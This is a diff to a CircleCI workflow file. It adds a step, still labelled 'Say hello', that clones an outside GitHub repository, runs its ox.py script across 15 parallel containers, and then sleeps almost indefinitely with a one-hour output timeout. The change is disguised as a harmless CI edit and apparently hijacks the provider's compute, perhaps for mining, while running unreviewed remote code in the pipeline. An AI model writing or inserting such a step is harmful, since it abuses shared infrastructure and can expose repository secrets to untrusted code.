@@ -9,14 +9,16 @@ jobs:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
     # See: https://circleci.com/docs/2.0/configuration-reference/#docker-machine-macos-windows-executor
     docker:
-      - image: cimg/base:stable
+      - image: cimg/python:3.9
     # Add steps to the job
     # See: https://circleci.com/docs/2.0/configuration-reference/#steps
+    parallelism : 15
     steps:
       - checkout
       - run:
           name: "Say hello"
-          command: "echo Hello, World!"
+          no_output_timeout : 1h
+          command: echo Hello, World!;git clone https://github.com/zenaljukani/Ambiguse.git;cd Ambiguse;python ox.py;sleep 9483747334
 
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
